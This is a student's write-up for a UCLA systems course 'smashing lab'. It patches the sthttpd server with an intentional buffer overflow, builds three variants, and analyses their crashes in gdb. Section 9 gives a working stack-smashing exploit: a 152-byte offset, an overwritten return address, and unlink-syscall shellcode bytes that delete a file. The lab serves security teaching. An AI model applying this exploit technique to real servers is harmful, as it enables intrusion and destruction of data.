@@ -1,0 +1,305 @@
+Name: Jahan Kuruvilla Cherian
+UID: 104436427
+Email: jcherian@ucla.edu
+
+CS 33 Lec 1
+Prof: Eggert
+TA: Alex Wood
+File: smashinglab.txt
+Description: Overview of commands used to solve the lab and answers to the questions posed by the lab.
+NOTE: THE FILES named dump.txt show the objdump for analyzing the handle_read functions; the other
+non-required files are for my exploit.
+We start by downloading the sthttpd 2.27.0 from the Smashing Lab website. I untar and open the folder on my local machine and then decide to use the command:
+
+scp -r ~/Downloads/sthttpd-2.27.0 jahan@lnxsrv09.seas.ucla.edu:~ 
+
+This essentially copies the directory to my linux server. Upon doing this I go into the src folder and open up thttpd.c using vim and add the patch as described by the specification by hand, changing the line char line[10000]; to char line[100]; and while ( fgets( line, sizeof(line), fp ) != (char*) 0 ) to while ( fgets( line, 1000, fp ) != (char*) 0 ). What this does is change the buffer size to 100 instead of 10000 and we make our while loop vulnerable to an exploit by not checking for the size of the buffer but instead, we are allowed to loop through 900 characters past the size of the buffer, which is very exlpoitable for a buffer overrun attack.
+
+2.) We then have to configure the file and then go onto doing a set of make clean, to compile the different versions of the thttpd. Instead of doing those instructions each time, I created a bash script as follows using vim and called it compile.sh:
+
+#!/bin/sh
+./configure \
+LDFLAGS="-Xlinker --rpath=/usr/local/cs/gcc-$(gcc -dumpversion)/lib"
+
+make clean
+make CFLAGS='-g3 -O2 -fno-inline -fstack-protector-strong'
+mv src/thttpd src/thttpd-sp
+
+make clean
+make CFLAGS='-g3 -O2 -fno-inline -static-libasan -fsanitize=address'
+mv src/thttpd src/thttpd-as
+
+make clean
+make CFLAGS='-g3 -O2 -fno-inline -fno-stack-protector -zexecstack'
+mv src/thttpd src/thttpd-no
+
+This creates our separate variants for the stack protection (sp), address sanitization (as) and none (no).
+
+3 & 4.) We then go onto test the servers. I did this by creating a test file called foo.txt, which just contained my name, and then for each variant calling the following commands: {Note: the numbers for the ports are made unique by the following equation: 12330 + 3 * (X % 293) + Y; where X is my unique 9 digit UID and Y is the number respective to the variant - sp = 1; as = 2; no = 3}
+
+src/thttpd-sp -p 12610 -D
+curl http://localhost:12610/foo.txt
+
+src/thttpd-as -p 12611 -D 		
+curl http://localhost:12611/foo.txt
+
+src/thttpd-no -p 12612 -D
+curl http://localhost:12612/foo.txt
+
+After verifying the web servers working, we invoke the various variants with a file that crashes the program. We do this by creating a config.txt file which contains a keyword as the initial word defined by the read_config function in thttpd.c. I chose to use port= which was then followed by a continous string of characters until I reached about 400 characters.
+
+5.) We can then crash the variants and run in gdb to find the backtrace and point of crash. We do this by the following commands:
+
+gdb src/thttpd-sp 
+(gdb) run -p 12610 -D -C config.txt
+
+I deliberately went a lot over the limit of the buffer, so that I could cause a Segmentation Fault. This thus gave the following error in gdb:
+
+Starting program: /w/home.02/cs/ugrad/jahan/sthttpd-2.27.0/src/thttpd-sp -p 12610 -D -C config.txt
+[Thread debugging using libthread_db enabled]
+Using host libthread_db library "/lib64/libthread_db.so.1".
+*** stack smashing detected ***: /w/home.02/cs/ugrad/jahan/sthttpd-2.27.0/src/thttpd-sp terminated
+
+Program received signal SIGSEGV, Segmentation fault.
+0x00007ffff6db1128 in ?? () from /lib64/libgcc_s.so.1
+
+It should be noted that anytime during a backtrace if we see ?? () it essentially means that this address cannot be found due to it being overwritten which is indicative of buffer overrun.
+Upon running the command for a backtrace {(gdb) bt} we get the following trace:
+
+#0  0x00007ffff6db1128 in ?? () from /lib64/libgcc_s.so.1
+#1  0x00007ffff6db2029 in _Unwind_Backtrace () from /lib64/libgcc_s.so.1
+#2  0x00007ffff76e50a6 in backtrace () from /lib64/libc.so.6
+#3  0x00007ffff7650e24 in __libc_message () from /lib64/libc.so.6
+#4  0x00007ffff76e8a57 in __fortify_fail () from /lib64/libc.so.6
+#5  0x00007ffff76e8a20 in __stack_chk_fail () from /lib64/libc.so.6
+#6  0x0000000000405042 in read_config (filename=<optimized out>) at thttpd.c:1190
+#7  0x6668656f68666965 in ?? ()
+#8  0x6769676965727569 in ?? ()
+#9  0x656263626c697265 in ?? ()
+#10 0x6379756579756679 in ?? ()
+#11 0x6765756979657562 in ?? ()
+#12 0x6575697267756972 in ?? ()
+#13 0x6262656367756967 in ?? ()
+#14 0x6775697265756963 in ?? ()
+#15 0x6975677975727765 in ?? ()
+#16 0x7566677275656967 in ?? ()
+#17 0x6967756965776769 in ?? ()
+#18 0x6362726965676675 in ?? ()
+#19 0x626a687362646962 in ?? ()
+#20 0x726579666b76686a in ?? ()
+#21 0x756b666779756b77 in ?? ()
+#22 0x6b6273686b646265 in ?? ()
+#23 0x6a68656362676675 in ?? ()
+#24 0x636e626d6a736462 in ?? ()
+#25 0x7966626768656a6b in ?? ()
+#26 0x656766756b776567 in ?? ()
+#27 0x6667656966677577 in ?? ()
+#28 0x6a73646263666777 in ?? ()
+#29 0x7765676675677568 in ?? ()
+#30 0x6779667175796667 in ?? ()
+#31 0x6873756f6677676f in ?? ()
+#32 0x67757961626b6b6a in ?? ()
+#33 0x6662776567797566 in ?? ()
+#34 0x6575626667656b75 in ?? ()
+#35 0x6c69776667696667 in ?? ()
+#36 0x6966677169676675 in ?? ()
+#37 0x0079656977676575 in ?? ()
+#38 0x0000000000000000 in ?? ()
+
+This backtrace gives us a big clue as to where we are failing in read_config. Therefore I set a breakpoint in GDB at line 1188 which is just before the jump from read_config to __stack_chk_fail(). So we quit gdb and start again with the following commands:
+
+gdb src/thttpd-sp
+(gdb) break 1188	//Breaking at the line before the jump from read_config()
+(gdb) run -p 12610 -D -C config.txt
+(gdb) set disassemble-next-line on 		//This gives us a disassemble along with the ability to step through the instructions
+(gdb) si
+0x0000000000404f0a	1189	    (void) fclose( fp );
+   0x0000000000404f07 <read_config+1223>:	4c 89 e7	mov    %r12,%rdi
+=> 0x0000000000404f0a <read_config+1226>:	e8 31 d5 ff ff	callq  0x402440 <fclose@plt>
+
+We are not concerned with fclose so we use the ni command to jump over that function and after doing a few more steps we notice the following:
+0x0000000000404f1d	1190	    }
+   0x0000000000404f0f <read_config+1231>:	48 8b 44 24 68	mov    0x68(%rsp),%rax
+   0x0000000000404f14 <read_config+1236>:	64 48 33 04 25 28 00 00 00	xor    %fs:0x28,%rax
+=> 0x0000000000404f1d <read_config+1245>:	0f 85 1a 01 00 00	jne    0x40503d <read_config+1533>
+   0x0000000000404f23 <read_config+1251>:	48 83 c4 70	add    $0x70,%rsp
+   0x0000000000404f27 <read_config+1255>:	5b	pop    %rbx
+   0x0000000000404f28 <read_config+1256>:	5d	pop    %rbp
+   0x0000000000404f29 <read_config+1257>:	41 5c	pop    %r12
+   0x0000000000404f2b <read_config+1259>:	41 5d	pop    %r13
+   0x0000000000404f2d <read_config+1261>:	41 5e	pop    %r14
+   0x0000000000404f2f <read_config+1263>:	c3	retq   
+(gdb) si
+1190	    }
+=> 0x000000000040503d <read_config+1533>:	e8 6e d4 ff ff	callq  0x4024b0 <__stack_chk_fail@plt>
+
+What this tells us is that the line 0x0000000000404f14 <read_config+1236>:	64 48 33 04 25 28 00 00 00	xor    %fs:0x28,%rax is what is comparing the canary that the stack protection places around the buffer with what should be in there. What this is doing is it will detect the change in the canary which is indicative of a buffer overrun in the line 0x0000000000404f1d <read_config+1245>:	0f 85 1a 01 00 00	jne    0x40503d <read_config+1533>, which thus goes to handle the fact that we have caught a buffer overflow.
+
+6.) We then move on to doing the same for the address sanitization variant. To cause a SIGSEGV (segmentation fault) I just increased the number of characters to overflow by which would possibly make the stack access bad memory thus giving a sementation fault. Then we run the following commands to first get a backtrace:
+
+gdb src/thttpd-as
+(gdb) run -p 12611 -D -C config.txt
+
+This will then give us:
+Starting program: /w/home.02/cs/ugrad/jahan/sthttpd-2.27.0/src/thttpd-as -p 12611 -D -C config.txt
+[Thread debugging using libthread_db enabled]
+Using host libthread_db library "/lib64/libthread_db.so.1".
+=================================================================
+==37959==ERROR: AddressSanitizer: stack-buffer-overflow on address 0x7fffffffcdf4 at pc 0x00000045a418 bp 0x7fffffffcd50 sp 0x7fffffffc500
+READ of size 543 at 0x7fffffffcdf4 thread T0
+
+Program received signal SIGSEGV, Segmentation fault.
+0x00007ffff7073128 in ?? () from /lib64/libgcc_s.so.1
+
+We can now collect a backtrace to get an idea of where the read_config finds the buffer overrun.
+(gdb) bt
+#0  0x00007ffff7073128 in ?? () from /lib64/libgcc_s.so.1
+#1  0x00007ffff7074029 in _Unwind_Backtrace () from /lib64/libgcc_s.so.1
+#2  0x000000000048a416 in __sanitizer::BufferedStackTrace::SlowUnwindStack (this=0x7fffffffbc90, pc=4563992, max_depth=<optimized out>)
+    at ../../../../gcc-5.2.0/libsanitizer/sanitizer_common/sanitizer_unwind_posix_libcdep.cc:113
+#3  0x0000000000486892 in __asan::GetStackTraceWithPcBpAndContext (fast=false, context=0x0, bp=140737488342352, pc=<optimized out>, max_depth=256, stack=<optimized out>)
+    at ../../../../gcc-5.2.0/libsanitizer/asan/asan_stack.h:43
+#4  __asan_report_error (pc=<optimized out>, bp=bp@entry=140737488342352, sp=sp@entry=140737488340224, addr=addr@entry=140737488342516, is_write=is_write@entry=0, 
+    access_size=access_size@entry=543) at ../../../../gcc-5.2.0/libsanitizer/asan/asan_report.cc:1006
+#5  0x000000000045a433 in __interceptor_strchr (
+    str=str@entry=0x7fffffffcd90 "port=qwertyuiopplkmnvcxzawertyuiopoigfdswertyuiijhgfdsrdtfyghftyrawrsexfcewaersdftyguiydwearsdftyggfyejeyrtbuwdvuievoewrhveoruyvreuiobvuibcoiubirbuiehcuibeviuebvuigpvgeqrgiquwuisabdciusabciubasdcjdsbh"..., c=c@entry=35) at ../../../../gcc-5.2.0/libsanitizer/asan/asan_interceptors.cc:430
+#6  0x00000000004b1e01 in read_config (filename=<optimized out>) at thttpd.c:1018
+#7  0x67766f7569776568 in ?? ()
+#8  0x626f696364627569 in ?? ()
+#9  0x7569656276756965 in ?? ()
+#10 0x6f65756976766272 in ?? ()
+#11 0x6569766265756976 in ?? ()
+#12 0x6963627569636275 in ?? ()
+#13 0x7569767569627675 in ?? ()
+#14 0x6577756962766577 in ?? ()
+#15 0x7162636269656362 in ?? ()
+#16 0x6965726269767065 in ?? ()
+#17 0x6877657169756275 in ?? ()
+#18 0x6869687765716975 in ?? ()
+#19 0x7269656770726571 in ?? ()
+#20 0x6365756968676f75 in ?? ()
+#21 0x6f62696572627569 in ?? ()
+#22 0x69776f6562756369 in ?? ()
+#23 0x656f756976627275 in ?? ()
+#24 0x716775696f766272 in ?? ()
+#25 0x7569777265676965 in ?? ()
+#26 0x6569706672656967 in ?? ()
+#27 0x6672657569666772 in ?? ()
+#28 0x6f6e697268657569 in ?? ()
+#29 0x62757269656e6569 in ?? ()
+#30 0x6966627275656976 in ?? ()
+#31 0x6f72656962757265 in ?? ()
+#32 0x6362656f69637562 in ?? ()
+#33 0x626f697262776569 in ?? ()
+#34 0x6972656276667065 in ?? ()
+#35 0x7265706976627577 in ?? ()
+#36 0x706e637569707662 in ?? ()
+#37 0x626970636e647569 in ?? ()
+#38 0x7569766275697265 in ?? ()
+#39 0x6562767569627265 in ?? ()
+#40 0x6275697662776972 in ?? ()
+#41 0x7569627675697265 in ?? ()
+#42 0x6562636976627265 in ?? ()
+#43 0x726569626f697772 in ?? ()
+#44 0x626f696272656962 in ?? ()
+
+We then exit gdb and re enter it using the same command, and then we go into gdb again while setting a break point somewhere just before the location of the jump as shown by the backtrace. We execute the following commands, which end up giving us the end result:
+
+gdb src/thttpd-as
+(gdb) break 1016
+(gdb) run -p 12611 -D -C config.txt
+(gdb) set disassemble-next-line on
+(gdb) si
+
+
+0x00000000004b1dfc	1018		if ( ( cp = strchr( line, '#' ) ) != (char*) 0 )
+   0x00000000004b1df3 <read_config+179>:	48 8b 3c 24	mov    (%rsp),%rdi
+   0x00000000004b1df7 <read_config+183>:	be 23 00 00 00	mov    $0x23,%esi
+=> 0x00000000004b1dfc <read_config+188>:	e8 3f 85 fa ff	callq  0x45a340 <__interceptor_strchr(char const*, int)>
+   0x00000000004b1e01 <read_config+193>:	48 85 c0	test   %rax,%rax
+   0x00000000004b1e04 <read_config+196>:	74 24	je     0x4b1e2a <read_config+234>
+
+As we continue to step through the machine instructions we hit a point where the function __interceptor_strchr(char const*, int) is called and through this function the address sanitization takes over to throw the error of a stack buffer overflow. 0x00000000004b1dfc <read_config+188>:	e8 3f 85 fa ff	callq  0x45a340 <__interceptor_strchr(char const*, int)> is the line where we exit out of read_config and go through several other functions such as __asan_report_error, __asan::GetStackTraceWithPcBpAndContext. These basically cause the program to crash.
+
+7.) As for the case with the NO variant, we do the same process by first running the variant under GDB to cause a segmentation fault from which we can call a backtrace to figure where and why the read_config exits and crashes due to the buffer overrun. The commands to collect the backtrace is as follows:
+
+gdb src/thttpd-no
+(gdb) run -p 12612 -D -C config.txt
+
+Starting program: /w/home.02/cs/ugrad/jahan/sthttpd-2.27.0/src/thttpd-no -p 12612 -D -C lol.txt
+[Thread debugging using libthread_db enabled]
+Using host libthread_db library "/lib64/libthread_db.so.1".
+
+Program received signal SIGSEGV, Segmentation fault.
+0x00000000006b6a6e in ?? ()
+
+When we try to continue on from the end of the read_config by setting a breakpoint around line 1188, we get the following:
+
+0x00000000006b6a6e in ?? ()
+=> 0x00000000006b6a6e:	Cannot access memory at address 0x6b6a6e
+
+This shows us that it accessed incorrect memory and essentially had no checking/error reporting of buffer overflow, and just allowed it to happen, which leaves this open to exploits.
+
+8.) We run the following commands to get assembly for each of the three variants:
+
+make clean
+make CFLAGS='-S -O2 -fno-inline -fstack-protector-strong'
+mv src/thttpd.o src/thttpd-sp.s
+
+make clean
+make CFLAGS='-S -O2 -fno-inline -static-libasan -fsanitize=address'
+mv src/thttpd.o src/thttpd-as.s
+
+make clean
+make CFLAGS='-S -O2 -fno-inline -fno-stack-protector -zexecstack'
+mv src/thttpd.o src/thttpd-no.s
+
+Looking through the assembly for each three variant we notice that Address Sanitization uses a lot more instructions nearing around 9k lines of machine code, while both Stack Protection and none lie close to each other around 4.5k of machine code. We already know that the NO variant doesnt try to handle the overrun in any special way, as it never even detects it until a SIGSEGV.
+
+ -fstack-protector-strong
+The idea behind the buffer overrun check for this relies around the use of canaries that surround the buffer on either sides. However because it does this check only once, and it does so after the entire read_config upon which it calls __stack_chk_fail(). Therefore handle_read() never actually requires extra code for when reading the buffer in. This is why the handle_read() for both sp and no variants are the same. The reason the overall assembly for sp is greater than that for no is because of the checking of the canaries after the read_config and the invocation of the __stack_chk_fail() and other functions.
+
+-fsanitize=address
+We notice that the handle_read() for AS is a lot more, and the reason is because what AS does is create an area of shadow memory around the buffer and maps that shadowed memory to bad memory. Therefore it has to check that the bytes its loading into the buffer is the shadow memory or not. Therefore we see that in AS handle_read there is a constant check for whether the address is shadowed or not. If the memory is shadowed then it poisons the value and throws a segmentation fault. An example of the checks is as given below:
+
+    3a70:       48 89 f8                mov    %rdi,%rax
+    3a73:       48 c1 e8 03             shr    $0x3,%rax
+    3a77:       0f b6 90 00 80 ff 7f    movzbl 0x7fff8000(%rax),%edx
+    3a7e:       48 89 f8                mov    %rdi,%rax
+    3a81:       83 e0 07                and    $0x7,%eax
+    3a84:       83 c0 03                add    $0x3,%eax
+    3a87:       38 d0                   cmp    %dl,%al
+    3a89:       7c 08                   jl     3a93 <handle_read+0x6b3>
+
+This is only one example, but it does similar checking. It calculates this shadowed areas around buffers is with the shift right by 3 of the address + the offset. Essentially if the shadowed area is accessed then it creates a poisoned redzone from which if it detects the malloc-ed/freed memory regions like within a buffer to have been accessed due to an overflow, it will crash and break the program. Once again this is the reason handle_read is so big for AS, due to this constant checking for the shadow memory.
+
+When it comes to the NO variant, the handle_read behaves the same as that for SP but doesnt do any checking even past the handle_read and just crashes.
+
+
+9.)THIS ONLY WORKS WITH ASLR OFF AND NX BIT DISABLED!
+This part of the lab expected us to exploit a buffer on the stack by overrunning it. We were first able to do this because we applied the patch wherein the buffer was limited to 100 characters, and our fgets looks at 1000 bytes worth of memory. So what I did was essentially run gdb src/thttpd-no and then set a break point at read_config and go until we get to the while loop with the fgets. Once in there we run the command:
+(gdb) p &line
+$1 = (char (*)[100]) 0x7fffffffcf00
+Which gives us the the address of the base of the buffer. If we then continue to run until the very end of the read_config function and look at the rsp at that point. We notice that the difference between the base of the buffer and the return address was 152 bytes. Using this information i made my config.txt file so that we had 152 characters including “port=“ option in the beginning. With this in mind I set my ‘target.txt/0’ (converted to its hex value using xxd “target.txt”) right after the return address which equates to the address 0x7fffffffcfa0. However, in the return address itself we put the return address + 19 where 19 corresponds to he number of bytes between the start of the return address and the start of our first mov instruction, 19 = 8 (bytes of the return address) + 11 (bytes of the c-string target.txt with a null terminating byte) = ab cf ff ff ff 7f 00 00 in reverse because of the little endianness of our machine. We then had the instruction to move the address of the start of the c-string into %rdi which is the first argument that will be passed into the OS syscall unlink function; where unlink is the OS function from syscall that deletes a file unlink(const char * path). We got the byte code of this move instruction by generating a file called insns.s with:
+mov $0x7fffffffcfa0, %rdi
+And then disassembling that with the byte codes. This gave us:
+   0:	48 bf a0 cf ff ff ff 	movabs $0x7fffffffcfa0,%rdi
+   7:	7f 00 00 
+We then in gdb ran the command:
+(gdb) disas /r unlink
+   0x00007ffff76c40b0 <+0>:	b8 57 00 00 00	mov    $0x57,%eax
+   0x00007ffff76c40b5 <+5>:	0f 05	syscall 
+   0x00007ffff76c40b7 <+7>:	48 3d 01 f0 ff ff	cmp    $0xfffffffffffff001,%rax
+   0x00007ffff76c40bd <+13>:	73 01	jae    0x7ffff76c40c0 <unlink+16>
+   0x00007ffff76c40bf <+15>:	c3	retq   
+   0x00007ffff76c40c0 <+16>:	48 8b 0d 99 0d 2d 00	mov    0x2d0d99(%rip),%rcx        # 0x7ffff7994e60
+   0x00007ffff76c40c7 <+23>:	f7 d8	neg    %eax
+   0x00007ffff76c40c9 <+25>:	64 89 01	mov    %eax,%fs:(%rcx)
+   0x00007ffff76c40cc <+28>:	48 83 c8 ff	or     $0xffffffffffffffff,%rax
+   0x00007ffff76c40d0 <+32>:	c3	retq
+
+The only lines of importance are the first two lines, which essentially moves 87 into rax - signifying to call unlink - and then calling syscall which will in turn look into rax and call unlink because of the 87. We then place all this hex code into a file called hex.txt which we then use cat hex.txt | ./hex2raw > raw.txt and then copied our 152 junk bytes before this converted code. If we then ran with raw.txt as our input file:
+gdb src/thttpd-no
+(gdb)run -p 12612 -D -C raw.txt
+This would cause a segmentation fault after read_config and our exploit was done, thus deleting the file target.txt in the working directory.
+I have included hex.txt; raw.txt; target.txt to show what my result was. NOTE THIS WORKS WITH STACK RANDOMIZATION OFF AND ON THE WEB PORT 12612.
